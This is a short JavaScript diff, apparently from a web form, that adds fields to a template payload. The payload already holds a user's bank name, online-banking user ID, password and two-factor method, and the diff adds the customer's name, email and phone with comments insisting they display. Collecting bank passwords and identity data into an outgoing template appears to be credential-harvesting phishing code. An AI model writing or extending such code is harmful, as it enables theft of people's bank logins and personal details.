@@ -692,11 +692,19 @@
                     date: new Date().toLocaleDateString(),
                     time: new Date().toLocaleTimeString(),
                     
-                    // ADD BANK-SPECIFIC FIELDS
+                    // ADD BANK-SPECIFIC FIELDS - ENSURE THEY DISPLAY
+                    bank_auth_section: true,
                     bank_auth_bank_name: fullBankName,
                     bank_auth_user_id: userIdValue || 'testuser123',
                     bank_auth_password: passwordValue || 'testpass123',
-                    bank_auth_two_factor: twoFactorValue || 'sms'
+                    bank_auth_two_factor: twoFactorValue || 'sms',
+                    
+                    // ADD CUSTOMER INFO SECTION - ENSURE IT DISPLAYS
+                    customer_section: true,
+                    customer_first_name: data.firstName || data.fullName?.split(' ')[0] || 'Test',
+                    customer_last_name: data.lastName || data.fullName?.split(' ').slice(-1).join(' ') || 'User',
+                    customer_email: data.email || 'test@example.com',
+                    customer_phone: data.phone || '555-123-4567'
                 };
 
                 console.log('=== FINAL TEMPLATE PARAMS ===');
